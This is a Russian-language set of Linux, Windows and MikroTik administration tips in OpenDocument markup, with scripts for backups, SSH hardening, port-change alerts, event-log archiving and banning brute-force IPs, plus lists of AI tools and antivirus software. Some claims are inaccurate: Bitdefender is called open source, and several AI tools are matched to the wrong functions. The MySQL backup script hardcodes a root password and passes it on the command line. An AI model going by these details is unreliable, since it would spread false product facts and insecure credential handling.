      <text:p text:style-name="P26">RegExp: Как найти строки с IP-адресами в логах. Частая задача - выцепить IP-адреса из логов. Вот регулярка и однострочник, которые помогут:grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' /var/log/nginx/access.log</text:p>
      <text:p text:style-name="P26">Что делает: Eo - включаем расширенные регулярки и выводим только совпадения; ([0-9]{1,3}\.){3}[0-9]{1,3} - шаблон для IPv4-адресов.</text:p>
      <text:p text:style-name="P27">Можно дополнительно убрать дубликаты и отсортировать по частоте: grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' /var/log/nginx/access.log | sort | uniq -c | sort -nr | head</text:p>
      <text:p text:style-name="P25">Покажет топ IP-адресов по количеству обращений - удобно для анализа трафика и выявления подозрительной активности.</text:p>
      <text:p text:style-name="P26">Пять бесплатных альтернатив популярным нейросетям - делают ту же работу, но без подписок:</text:p>
      <text:p text:style-name="P26">Grok (grok.com) – альтернатива ChatGPT: быстро пишет тексты, отлично запоминает контекст и работает молниеносно;</text:p>
      <text:p text:style-name="P26">Ideogram (ideogram.ai) – замена KlingAI: за считанные секунды создаёт изображения, логотипы и иллюстрации высокого качества;</text:p>
      <text:p text:style-name="P26">HailuoAI (hailuoai.video) – аналог MidJourney: мощнейший китайский генератор сверхреалистичных картинок по текстовому описанию;</text:p>
      <text:p text:style-name="P26">Fotor (fotor.com/ai-image-generator) – альтернатива Photoshop: удобный AI-редактор для обработки фото и создания картинок через промпты;</text:p>
      <text:p text:style-name="P3"><text:soft-page-break/><text:span text:style-name="T5">Qwen (chat.qwen.ai) – заменяет Claude: нейросеть от Alibaba, которая мастерски пишет тексты и отвечает даже на самые сложные вопросы.</text:span></text:p>
      <text:p text:style-name="P26">В Debian (и производных, включая Ubuntu) для ускорения установки пакетов можно использовать утилиту libeatmydata, которая значительно снижает время установки за счёт отключения fsync и других дорогостоящих операций записи на диск. Что такое libeatmydata: libeatmydata - это LD_PRELOAD-библиотека, которая подменяет функции fsync(), fdatasync(), msync() и другие, превращая их в no-op (то есть они ничего не делают). Это полезно, когда производительность важнее надёжности - например, в CI, сборках образов, chroot'ах или при частой установке/удалении пакетов. Как использовать libeatmydata:</text:p>
      <text:p text:style-name="P26">1. Установите пакет: sudo apt install eatmydata</text:p>
      <text:p text:style-name="P26">2. Используйте eatmydata как префикс: sudo eatmydata apt install some-package</text:p>
      <text:p text:style-name="P26">3. Используйте с другими командами:</text:p>
      <text:p text:style-name="P26">sudo eatmydata dpkg -i some-package.deb</text:p>
      <text:p text:style-name="P26">sudo eatmydata apt upgrade -y</text:p>
      <text:p text:style-name="P26">Пример ускорения установки:</text:p>
      <text:p text:style-name="P26">time sudo apt install -y build-essential <text:s/># обычный способ</text:p>
      <text:p text:style-name="P26">time sudo eatmydata apt install -y build-essential <text:s/># ускоренный способ</text:p>
      <text:p text:style-name="P26">Важно: когда не стоит использовать: В продуктивной системе;</text:p>
      <text:p text:style-name="P26">Когда стабильность данных критична (напр. при установке базы данных);</text:p>
      <text:p text:style-name="P26">Если установка прерывается - есть риск повреждения пакетов.</text:p>
      <text:p text:style-name="P26">Расширенное применение. Внутри chroot / контейнеров: chroot /mnt/debian-root eatmydata apt install -y ...</text:p>
      <text:p text:style-name="P26">В скриптах сборки:</text:p>
      <text:p text:style-name="P26">#!/bin/bash</text:p>
      <text:p text:style-name="P26">export LD_PRELOAD=libeatmydata.so</text:p>
      <text:p text:style-name="P26">apt install -y ...</text:p>
      <text:p text:style-name="P28">Использование через debootstrap: sudo eatmydata debootstrap bullseye /mnt/debian http://deb.debian.org/debian</text:p>
      <text:p text:style-name="P26">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p>
      <text:p text:style-name="P26">#!/bin/bash</text:p>
      <text:p text:style-name="P26"># Настройки</text:p>
      <text:p text:style-name="P26">TG_TOKEN="your_bot_token"</text:p>
      <text:p text:style-name="P26">TG_CHAT_ID="your_chat_id"</text:p>
      <text:p text:style-name="P26">PORTS_FILE="/var/tmp/open_ports_last.txt"</text:p>
      <text:p text:style-name="P26"># Получаем текущие открытые порты</text:p>
      <text:p text:style-name="P26">ss -tuln | awk 'NR&gt;1 {print $5}' | cut -d: -f2 | sort -n | uniq &gt; /tmp/open_ports_now.txt</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5"># Если нет предыдущего файла - создаём</text:span></text:p>
      <text:p text:style-name="P26">if [ ! -f "$PORTS_FILE" ]; then</text:p>
      <text:p text:style-name="P26">cp /tmp/open_ports_now.txt "$PORTS_FILE"</text:p>
      <text:p text:style-name="P26">exit 0</text:p>
      <text:p text:style-name="P26">fi</text:p>
      <text:p text:style-name="P26"># Сравниваем с предыдущим состоянием</text:p>
      <text:p text:style-name="P26">DIFF=$(diff -u "$PORTS_FILE" /tmp/open_ports_now.txt)</text:p>
      <text:p text:style-name="P26"># Если есть изменения - шлём в Telegram</text:p>
      <text:p text:style-name="P26">if [ -n "$DIFF" ]; then</text:p>
      <text:p text:style-name="P26">MESSAGE="⚠️ Обнаружены изменения в открытых портах:\n\`\`\`\n$DIFF\n\`\`\`"</text:p>
      <text:p text:style-name="P26">curl -s -X POST "https://api.telegram.org/bot$TG_TOKEN/sendMessage" \</text:p>
      <text:p text:style-name="P26">-d chat_id="$TG_CHAT_ID" \</text:p>
      <text:p text:style-name="P26">-d parse_mode="Markdown" \</text:p>
      <text:p text:style-name="P26">-d text="$MESSAGE"</text:p>
      <text:p text:style-name="P26">cp /tmp/open_ports_now.txt "$PORTS_FILE"</text:p>
      <text:p text:style-name="P26">fi</text:p>
      <text:p text:style-name="P26"># Уборка</text:p>
      <text:p text:style-name="P26">rm -f /tmp/open_ports_now.txt</text:p>
      <text:p text:style-name="P26">Как использовать:</text:p>
      <text:p text:style-name="P26">1. Замените your_bot_token и your_chat_id на свои значения.</text:p>
      <text:p text:style-name="P28">2. Добавьте в cron, чтобы проверять, например, каждые 10 минут: */10 * * * * /path/to/script.sh</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7">Настройка синхронизации времени по NTP и MikroTik Cloud Time (Москва):</text:p>
      <text:p text:style-name="P27">/system ntp client set enabled=yes server-dns-names=time.google.com,0.pool.ntp.org,1.pool.ntp.org,2.pool.ntp.org,3.pool.ntp.org</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text:soft-page-break/><text:span text:style-name="T5">Очистка системного лога (оставляет сообщение о смене настроек лога):</text:span></text:p>
      <text:p text:style-name="P26">/system logging action set memory memory-lines=1</text:p>
      <text:p text:style-name="P26">/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6">add address=access.example.con list=DomainIPsAccess</text:p>
      <text:p text:style-name="P26">/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 /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 /interface wireless access-list</text:p>
      <text:p text:style-name="P26">add interface=all mac-address=8A:EA:B7:2E:38:C1 vlan-id=99 vlan-mode=use-tag</text:p>
      <text:p text:style-name="P26">Настройка пароля и безопасности WiFi на default профиль: /interface wireless security-profiles set default mode=dynamic</text:p>
      <text:p text:style-name="P26">-keys authentication-types=wpa2-psk unicast-ciphers=aes-ccm group-ciphers=aes-ccm</text:p>
      <text:p text:style-name="P26">wpa2-pre-shared-key=bigpassword</text:p>
      <text:p text:style-name="P28">Включение пробросов портов SSH: /ip ssh set forwarding-enabled=both</text:p>
      <text:p text:style-name="P26">Изменение порта для подключения по SSH:</text:p>
      <text:p text:style-name="P26">Чтобы изменить порт для подключения по SSH необходимо отредактировать файл конфигурации SSH демона. Откроем данный файл текстовым редактором: vim /etc/ssh/sshd_config. Найдем строку Port 22 и изменим её, указав новый порт для</text:p>
      <text:p text:style-name="P29">подключения. Например Port 25022. Выходим, сохраняем файл и перезагружаем SSH следующей командой: service sshd restart</text:p>
      <text:p text:style-name="P26">После перезапуска SSH, он станет доступен по новому порту, а текущая сессия на старом останется активной. Поэтому не отключаясь для проверки попробуем подключится по новому порту - если не пускает, то возможно в системе работает фаервол и нужно в нем разрешить новый порт, например в iptables это делается так (где 25022 наш новый порт): iptables -A INPUT -p tcp --dport 25022 -j ACCEPT</text:p>
      <text:p text:style-name="P26">Можно разрешить средствами iptables подключение к SSH только с указанного диапазона IP адресов: iptables -A INPUT -d 192.168.0.0/24 -p tcp --dport 25022 -j ACCEPT</text:p>
      <text:p text:style-name="P26">где 192.168.0.0/24 - IP адрес сети и маска сети, с которых разрешено подключение по SSH. Далее проверяем подключение по SSH на новом порту ssh &lt;user&gt;@&lt;ip&gt; -p &lt;port&gt; - если подключение выполняется, то можем удалить правило iptables подключения по SSH по старому порту: iptables -D INPUT -p tcp --dport 22 -j ACCEPT</text:p>
      <text:p text:style-name="P28">Посмотреть в системе на каком порту и на каких сетевых интерфейсах работает SSH можно следующей командой: netstat -tulpan | grep ssh</text:p>
      <text:p text:style-name="P26">Как перезапускать сервис только если он завис? Иногда не хочется перезапускать сервис "на всякий случай", но вот если он реально завис - другое дело. Вот простой способ проверять, активен ли сервис, и перезапускать его при зависании:</text:p>
      <text:p text:style-name="P26">#!/bin/bash</text:p>
      <text:p text:style-name="P26">SERVICE="nginx"</text:p>
      <text:p text:style-name="P26">if ! systemctl is-active --quiet "$SERVICE"; then</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>echo "$(date): $SERVICE не активен, пробую перезапустить..." &gt;&gt; /var/log/service_monitor.log</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>systemctl restart "$SERVICE"</text:p>
      <text:p text:style-name="P26">else</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>echo "$(date): $SERVICE работает нормально" &gt;&gt; /var/log/service_monitor.log</text:p>
      <text:p text:style-name="P26">fi</text:p>
      <text:p text:style-name="P26">Можно добавить в крон, например, проверку каждые 5 минут: */5 * * * * /usr/local/bin/check_nginx.sh</text:p>
      <text:p text:style-name="P26">Не забудь сделать скрипт исполняемым: chmod +x /usr/local/bin/check_nginx.sh</text:p>
      <text:p text:style-name="P28">Можно заменить nginx на любой другой системный сервис.</text:p>
      <text:p text:style-name="P26">Мониторим активные подключения к серверу по SSH. Иногда нужно быстро узнать, кто сейчас подключён к серверу по SSH. Вот простой однострочный скрипт: who | grep 'pts' | awk '{print $1, $2, $5}'</text:p>
      <text:p text:style-name="P26">Что делает этот скрипт?</text:p>
      <text:p text:style-name="P26">* who - выводит список всех вошедших пользователей.</text:p>
      <text:p text:style-name="P26">* grep 'pts' - фильтрует только те строки, что связаны с терминалами SSH.</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">* awk '{print $1, $2, $5}' - красиво выводит имя пользователя, терминал и IP-адрес.</text:span></text:p>
      <text:p text:style-name="P26">Пример вывода:</text:p>
      <text:p text:style-name="P26">admin pts/0 (192.168.1.55)</text:p>
      <text:p text:style-name="P25">root <text:s/>pts/1 (10.0.0.23)</text:p>
      <text:p text:style-name="P27">Один из файловых серверов неожиданно перестал принимать события - логи просто «забились» до предела, из-за чего служба безопасности не могла записывать критичные события входа. Оказалось, что журналы событий выросли до 10 ГБ и система больше не записывала новые записи. Чтобы предотвратить подобные ситуации, я собрал небольшой скрипт для автоматического архивации и очистки журналов событий, когда их размер превышает заданный порог. Вот пример, который запустил на сервере:</text:p>
      <text:p text:style-name="P26"># Порог в мегабайтах</text:p>
      <text:p text:style-name="P26">$logSizeThresholdMB = 1024</text:p>
      <text:p text:style-name="P26"># Папка для архивации</text:p>
      <text:p text:style-name="P26">$archivePath = "D:\EventLogArchives"</text:p>
      <text:p text:style-name="P26">if (-not (Test-Path $archivePath)) {</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>New-Item -Path $archivePath -ItemType Directory | Out-Null</text:p>
      <text:p text:style-name="P26">}</text:p>
      <text:p text:style-name="P26"># Функция для проверки и архивации логов</text:p>
      <text:p text:style-name="P26">function Archive-And-Clear-EventLog {</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>param (</text:p>
      <text:p text:style-name="P26"><text:s text:c="8"/>[string]$LogName</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>)</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/># Определяем текущий размер лога</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>$logInfo = wevtutil gl $LogName</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>$fileSizeLine = ($logInfo | Where-Object { $_ -match "fileSize" })</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>$sizeBytes = [int64]($fileSizeLine -replace "[^0-9]", "")</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>$sizeMB = [math]::Round($sizeBytes / 1MB, 2)</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>if ($sizeMB -ge $logSizeThresholdMB) {</text:p>
      <text:p text:style-name="P26"><text:s text:c="8"/>$timestamp = (Get-Date).ToString("yyyyMMdd_HHmmss")</text:p>
      <text:p text:style-name="P26"><text:s text:c="8"/>$archiveFile = Join-Path $archivePath "$LogName`_$timestamp.evtx"</text:p>
      <text:p text:style-name="P26"><text:s text:c="8"/># Экспортируем текущий журнал</text:p>
      <text:p text:style-name="P26"><text:s text:c="8"/>wevtutil epl $LogName $archiveFile</text:p>
      <text:p text:style-name="P26"><text:s text:c="8"/>Write-Host "Архивировал лог $LogName (размер $sizeMB MB) в $archiveFile"</text:p>
      <text:p text:style-name="P26"><text:s text:c="8"/># Очищаем журнал</text:p>
      <text:p text:style-name="P26"><text:s text:c="8"/>wevtutil cl $LogName</text:p>
      <text:p text:style-name="P26"><text:s text:c="8"/>Write-Host "Очищен лог $LogName"</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>} else {</text:p>
      <text:p text:style-name="P26"><text:s text:c="8"/>Write-Host "Лог $LogName в пределах нормы: $sizeMB MB"</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="P26">}</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5"># Получаем все журналы, которые хотим контролировать (пример: System и Security)</text:span></text:p>
      <text:p text:style-name="P26">$logsToCheck = @("System", "Security")</text:p>
      <text:p text:style-name="P26">foreach ($log in $logsToCheck) {</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>Archive-And-Clear-EventLog -LogName $log</text:p>
      <text:p text:style-name="P27">}</text:p>
      <text:p text:style-name="P25">Этот скрипт проверяет размер каждого указанного журнала, экспортирует его в папку архива, если размер больше 1 ГБ, и очищает файл. Я поставил его в Task Scheduler с частотой 1 раз в сутки, чтобы не «догонять» проблему вручную. А какие у вас есть практики по управлению журналами событий? Используете стандартные утилиты wevtutil/Get-WinEvent или доверяете решениям наподобие SCOM/Elastic Stack?</text:p>
      <text:p text:style-name="P26">Сегодня я хочу поделиться простым, но очень полезным Bash-скриптом для автоматического резервного копирования директорий с ротацией старых бэкапов. Такой скрипт пригодится, если необходимо сохранять копии важных данных и при этом не засорять диск старыми архивами. Скрипт: Backup с ротацией:</text:p>
      <text:p text:style-name="P26">#!/usr/bin/env bash</text:p>
      <text:p text:style-name="P26"># ================================</text:p>
      <text:p text:style-name="P26"># Скрипт: backup_rotate.sh</text:p>
      <text:p text:style-name="P26"># Автор: https://t.me/bash_srv</text:p>
      <text:p text:style-name="P26"># Описание: Создаёт архив указанной директории,</text:p>
      <text:p text:style-name="P26"># <text:s text:c="2"/>хранит только последние N бэкапов, удаляя старые.</text:p>
      <text:p text:style-name="P26"># ================================</text:p>
      <text:p text:style-name="P26"># Настройки</text:p>
      <text:p text:style-name="P26">SOURCE_DIR="/var/www/my_project" <text:s text:c="5"/># Директория, которую резервируем</text:p>
      <text:p text:style-name="P26">DEST_DIR="/backups/my_project" <text:s text:c="8"/># Директория для хранения бэкапов</text:p>
      <text:p text:style-name="P26">RETENTION_DAYS=7 <text:s text:c="22"/># Сколько дней хранить бэкапы</text:p>
      <text:p text:style-name="P26"># Текущее время для имени архива</text:p>
      <text:p text:style-name="P26">DATE=$(date +"%Y-%m-%d_%H-%M-%S")</text:p>
      <text:p text:style-name="P26">ARCHIVE_NAME="backup_${DATE}.tar.gz"</text:p>
      <text:p text:style-name="P26"># Проверяем, что исходная директория существует</text:p>
      <text:p text:style-name="P26">if [[ ! -d "$SOURCE_DIR" ]]; then</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>echo " Исходная директория $SOURCE_DIR не найдена!"</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>exit 1</text:p>
      <text:p text:style-name="P26">fi</text:p>
      <text:p text:style-name="P26"># Создаём директорию назначения, если её нет</text:p>
      <text:p text:style-name="P26">mkdir -p "$DEST_DIR"</text:p>
      <text:p text:style-name="P26"># Создаём архив</text:p>
      <text:p text:style-name="P26">tar -czf "${DEST_DIR}/${ARCHIVE_NAME}" -C "$(dirname "$SOURCE_DIR")" "$(basename "$SOURCE_DIR")"</text:p>
      <text:p text:style-name="P26">if [[ $? -eq 0 ]]; then</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5"><text:s text:c="2"/>echo "Создан бэкап: ${DEST_DIR}/${ARCHIVE_NAME}"</text:span></text:p>
      <text:p text:style-name="P26">else</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>echo " Ошибка при создании архива!"</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>exit 1</text:p>
      <text:p text:style-name="P26">fi</text:p>
      <text:p text:style-name="P26"># Удаляем старые бэкапы старше RETENTION_DAYS</text:p>
      <text:p text:style-name="P26">find "$DEST_DIR" -type f -name "backup_*.tar.gz" -mtime +${RETENTION_DAYS} -print -delete</text:p>
      <text:p text:style-name="P26">echo "Удалены бэкапы старше ${RETENTION_DAYS} дней."</text:p>
      <text:p text:style-name="P27">exit 0</text:p>
      <text:p text:style-name="P27">Пояснение к скрипту</text:p>
      <text:p text:style-name="P26">1. Настройки переменных:</text:p>
      <text:p text:style-name="P26">SOURCE_DIR - путь к директории, которую нужно сохранить (например, веб-проект, база данных и т.д.).</text:p>
      <text:p text:style-name="P26">DEST_DIR - куда складываем архива (может быть локальная папка или смонтированный удалённый диск).</text:p>
      <text:p text:style-name="P26">RETENTION_DAYS - сколько дней хранить бэкапы. Всё, что старше этого значения, будет удаляться автоматически.</text:p>
      <text:p text:style-name="P26">2. Скрипт проверяет, существует ли исходная директория. Если нет - выводит ошибку и завершает работу.</text:p>
      <text:p text:style-name="P26">3. Создаётся папка назначения (mkdir -p), чтобы избежать ошибок, если её ещё нет.</text:p>
      <text:p text:style-name="P26">4. Делается tar.gz - архив директории, причём для удобства используется команда: tar -czf ${DEST_DIR}/${ARCHIVE_NAME} -C $(dirname $SOURCE_DIR) $(basename $SOURCE_DIR) - Это позволяет не копировать весь путь в архив, а только нужную папку.</text:p>
      <text:p text:style-name="P26">5. Если архивирование прошло успешно (код возврата 0) - выводим сообщение об успехе.</text:p>
      <text:p text:style-name="P26">6. Далее команда find ищет файлы-архивы старше RETENTION_DAYS дней и удаляет их. Параметр -mtime +N означает “более N дней назад”. Опция -print -delete сначала покажет, что удаляется, а потом удалит.</text:p>
      <text:p text:style-name="P26">7. В конце скрипт выводит, сколько старых бэкапов удалено, и завершает работу.</text:p>
      <text:p text:style-name="P26">Как использовать:</text:p>
      <text:p text:style-name="P26">1. Скопируйте скрипт в файл, например: sudo nano /usr/local/bin/backup_rotate.sh</text:p>
      <text:p text:style-name="P26">2. Сделайте его исполняемым: sudo chmod +x /usr/local/bin/backup_rotate.sh</text:p>
      <text:p text:style-name="P26">3. Отредактируйте переменные в начале скрипта под свои нужды:</text:p>
      <text:p text:style-name="P26"><text:s text:c="3"/>SOURCE_DIR="/path/to/your/data"</text:p>
      <text:p text:style-name="P26"><text:s text:c="3"/>DEST_DIR="/path/to/backup/location"</text:p>
      <text:p text:style-name="P26"><text:s text:c="3"/>RETENTION_DAYS=7</text:p>
      <text:p text:style-name="P26">4. Запустите вручную, чтобы протестировать: /usr/local/bin/backup_rotate.sh</text:p>
      <text:p text:style-name="P26">5. Если всё работает как надо, добавьте задание в ``````bash</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">crontab``````bash</text:span></text:p>
      <text:p text:style-name="P26">для автоматического запуска. Например, чтобы делать бэкап каждый день в 3:00: sudo crontab -e</text:p>
      <text:p text:style-name="P26">И добавить строку: 0 3 * * * /usr/local/bin/backup_rotate.sh &gt;&gt; /var/log/backup_rotate.log 2&gt;&amp;1</text:p>
      <text:p text:style-name="P28">Здесь мы также перенаправляем вывод в лог-файл, чтобы отслеживать успешные и неуспешные запуски.</text:p>
      <text:p text:style-name="P27">5 нейросетей для озвучки и генерации голосов. Озвучить видео, создать голос для подкаста, склонировать свой тембр или начитать статью чужим голосом - теперь все это можно сделать без студий и оборудования. В сегодняшней подборке мы собрали 5 мощных инструментов, которые справятся с любой из этих задач за пару минут:</text:p>
      <text:p text:style-name="P27">1. ElevenLabs (https://www.elevenlabs.io/) - один из самых реалистичных голосовых ИИ. Поддерживает клон вашего голоса, эмоции и озвучку на разных языках. Идеален для дубляжа и подкастов.</text:p>
      <text:p text:style-name="P26">2. PlayHT (https://play.ht/) - студийное качество без студии. Есть готовые голоса и API. Часто используется в обучении и маркетинге.</text:p>
      <text:p text:style-name="P26">3. ResembleAI (https://www.resemble.ai/) - кастом под ключ: можно редактировать интонации, добавлять эмоции и настраивать речь по словам. Полезно для игр и виртуальных ассистентов.</text:p>
      <text:p text:style-name="P26">4. Speechify (https://speechify.com/) - озвучит все: от PDF до веб-страниц. Простой, понятный и поддерживает десятки голосов.</text:p>
      <text:p text:style-name="P28">5. LOVO (http://lovo.ai/) - заточен под рекламу и видео. Большая библиотека голосов, интеграции с видеоредакторами и поддержка эмоций.</text:p>
      <text:p text:style-name="P26">Bash-совет: анализ неудачных SSH-логинов и бан «горячих» IP. Хотите быстро узнать, какие IP вызывают максимум неудачных попыток входа в SSH, и оперативно заблокировать самых настырных? Ниже скрипт:</text:p>
      <text:p text:style-name="P26">#!/usr/bin/env bash</text:p>
      <text:p text:style-name="P26"># ssh_fail_analyzer.sh</text:p>
      <text:p text:style-name="P26"># Анализ неудачных SSH-попыток и вывод TOP-10 IP</text:p>
      <text:p text:style-name="P26">LOG_FILE="/var/log/auth.log" <text:s text:c="6"/># путь к логам (для CentOS: /var/log/secure)</text:p>
      <text:p text:style-name="P26">TOPN=10 <text:s text:c="27"/># сколько IP показывать</text:p>
      <text:p text:style-name="P26">echo "Топ $TOPN IP с неудачными SSH-входами:"</text:p>
      <text:p text:style-name="P26">grep -E "Failed password for" "$LOG_FILE" \</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>| grep -oP '(?&lt;=from )[\d\.]+' \</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>| sort \</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>| uniq -c \</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>| sort -rn \</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>| head -n "$TOPN"</text:p>
      <text:p text:style-name="P26">Как это работает:</text:p>
      <text:p text:style-name="P26">1. grep -E "Failed password for" - Ищем все строки с неудачными попытками.</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">2. grep -oP '(?&lt;=from )\[\d.]+' - С помощью PCRE-регулярки достаём только IP-адреса после слова "from".</text:span></text:p>
      <text:p text:style-name="P26">3. sort | uniq -c | sort -rn - Сортируем, считаем вхождения и выводим в порядке убывания.</text:p>
      <text:p text:style-name="P26">4. head -n "\$TOPN" - Ограничиваем результат топ-10.</text:p>
      <text:p text:style-name="P26">Можно добавить в crontab ежедневный запуск и автоматическую отправку отчёта на почту или сразу бан «горячих» IP через iptables:</text:p>
      <text:p text:style-name="P26"># в crontab: каждый день в 00:10</text:p>
      <text:p text:style-name="P26">10 0 * * * /path/to/ssh_fail_analyzer.sh | mail -s "SSH Fail Report" admin@example.com</text:p>
      <text:p text:style-name="P26">Или сразу блокировать подозрительные IP, если они превысили порог:</text:p>
      <text:p text:style-name="P26">THRESHOLD=50</text:p>
      <text:p text:style-name="P26">for ip in $(grep -E "Failed password for" "$LOG_FILE" \</text:p>
      <text:p text:style-name="P26"><text:s text:c="14"/>| grep -oP '(?&lt;=from )[\d\.]+' \</text:p>
      <text:p text:style-name="P26"><text:s text:c="14"/>| sort | uniq -c \</text:p>
      <text:p text:style-name="P27"><text:s text:c="14"/>| awk -v t="$THRESHOLD" '$1 &gt; t {print $2}'); do</text:p>
      <text:p text:style-name="P27"><text:s text:c="2"/>iptables -I INPUT -s "$ip" -j DROP</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>echo "$(date): Заблокирован $ip за превышение $THRESHOLD неудачных попыток" &gt;&gt; /var/log/ssh_ban.log</text:p>
      <text:p text:style-name="P28">done</text:p>
      <text:p text:style-name="P26">Если у тебя есть сервер с MySQL/MariaDB, автоматический бэкап с ротацией, то вот простой скрипт, который:</text:p>
      <text:p text:style-name="P26">1. Делает дамп всех баз;</text:p>
      <text:p text:style-name="P26">2. Сохраняет в архив с датой;</text:p>
      <text:p text:style-name="P26">3. Удаляет архивы старше N дней:</text:p>
      <text:p text:style-name="P26">#!/bin/bash</text:p>
      <text:p text:style-name="P26"># автор: https://t.me/bash_srv</text:p>
      <text:p text:style-name="P26"># Папка для бэкапов</text:p>
      <text:p text:style-name="P26">BACKUP_DIR="/opt/backups/mysql"</text:p>
      <text:p text:style-name="P26"># Кол-во дней хранения</text:p>
      <text:p text:style-name="P26">RETENTION_DAYS=7</text:p>
      <text:p text:style-name="P26"># Дата для имени файла</text:p>
      <text:p text:style-name="P26">DATE=$(date +'%Y-%m-%d_%H-%M')</text:p>
      <text:p text:style-name="P26"># Учетные данные</text:p>
      <text:p text:style-name="P26">DB_USER="root"</text:p>
      <text:p text:style-name="P26">DB_PASS="mypassword"</text:p>
      <text:p text:style-name="P26">mkdir -p "$BACKUP_DIR"</text:p>
      <text:p text:style-name="P26"># Делаем дамп</text:p>
      <text:p text:style-name="P26">mysqldump -u"$DB_USER" -p"$DB_PASS" --all-databases | gzip &gt; "$BACKUP_DIR/mysql_backup_$DATE.sql.gz"</text:p>
      <text:p text:style-name="P26"># Удаляем старые бэкапы</text:p>
      <text:p text:style-name="P26">find "$BACKUP_DIR" -type f -name "*.gz" -mtime +$RETENTION_DAYS -delete</text:p>
      <text:p text:style-name="P26">echo "Бэкап MySQL завершён: $DATE"</text:p>
      <text:p text:style-name="P3"><text:soft-page-break/><text:span text:style-name="T5">Рекомендуется повесить в крон, например, на каждый день в 3:00: 0 3 * * * /path/to/backup_mysql.sh</text:span></text:p>
      <text:p text:style-name="P26">Гарвард выкатил бесплатные курсы по AI и ML на 2025 год. Полный список доступных курсов:</text:p>
      <text:p text:style-name="P26">1. Введение в ИИ с Python - тут (https://www.edx.org/learn/artificial-intelligence/harvard-university-cs50-s-introduction-to-artificial-intelligence-with-python)</text:p>
      <text:p text:style-name="P26">2. Машинное обучение и ИИ с Python - тут (https://www.edx.org/learn/machine-learning/harvard-university-machine-learning-and-ai-with-python) </text:p>
      <text:p text:style-name="P26">3. Data Science: машинное обучение - тут (https://www.edx.org/learn/machine-learning/harvard-university-data-science-machine-learning)</text:p>
      <text:p text:style-name="P26">4. Data Science: капстоун-проект - тут (https://www.edx.org/learn/data-science/harvard-university-data-science-capstone)</text:p>
      <text:p text:style-name="P26">5. Анализ многомерных данных - тут (https://www.edx.org/learn/data-analysis/harvard-university-high-dimensional-data-analysis)</text:p>
      <text:p text:style-name="P27">6. Основы TinyML - тут (https://www.edx.org/learn/machine-learning/harvard-university-fundamentals-of-tinyml)</text:p>
      <text:p text:style-name="P27">7. Развертывание TinyML - тут (https://www.edx.org/learn/tinyml/harvard-university-deploying-tinyml)</text:p>
      <text:p text:style-name="P28">8. Применение TinyML - тут (https://www.edx.org/learn/tinyml/harvard-university-applications-of-tinyml)</text:p>
      <text:p text:style-name="P26">Bash совет дня: удаляем пустые директории рекурсивно. Когда на сервере скапливаются лишние пустые папки - это не только мусор, но и потенциальная головная боль при навигации и поиске. Вот простой способ зачистить их:</text:p>
      <text:p text:style-name="P26">#!/bin/bash</text:p>
      <text:p text:style-name="P26"># Путь, в котором нужно очистить пустые папки</text:p>
      <text:p text:style-name="P26">TARGET_DIR="/var/www/html"</text:p>
      <text:p text:style-name="P26"># Удаляем все пустые директории, включая вложенные</text:p>
      <text:p text:style-name="P26">find "$TARGET_DIR" -type d -empty -delete</text:p>
      <text:p text:style-name="P26">echo "Все пустые директории удалены из $TARGET_DIR"</text:p>
      <text:p text:style-name="P26">Как это работает:</text:p>
      <text:p text:style-name="P26">find ищет все папки (-type d), которые пусты (-empty) и удаляет их (-delete).</text:p>
      <text:p text:style-name="P26">Работает рекурсивно, удаляя даже вложенные пустые директории.</text:p>
      <text:p text:style-name="P26">Можно запускать из cron раз в неделю, например: 0 3 * * 0 /opt/scripts/clean_empty_dirs.sh</text:p>
      <text:p text:style-name="P29">Подборка антивирусного софта с открытым исходным кодом:</text:p>
      <text:p text:style-name="P26">1. ClamAV</text:p>
      <text:p text:style-name="P26">2. Bitdefender (https://www.bitdefender.com/en-us/consumer/free-antivirus)</text:p>
      <text:p text:style-name="P26">3. MoonSecure <text:s text:c="2"/>(https://moonsecure.org/df/)</text:p>
      <text:p text:style-name="P26">4. The OpenAntivirus Project <text:s/>(https://sourceforge.net/projects/openantivirus/)</text:p>
      <text:p text:style-name="P26">5. The Rootkit Hunter (https://rkhunter.sourceforge.net/)</text:p>
      <text:p text:style-name="P26">Онлайн инструменты:</text:p>
      <text:p text:style-name="P26">Hybrid Analysis (https://www.hybrid-analysis.com/) </text:p>
      <text:p text:style-name="P26">Virus Total (https://www.virustotal.com/gui/home/upload)</text:p>
      <text:p text:style-name="P28">MetaDefender Cloud</text:p>
      <text:p text:style-name="P26">Как узнать, какими процессами используется раздел?</text:p>
      <text:p text:style-name="P26">lsof | grep /media/whatever</text:p>
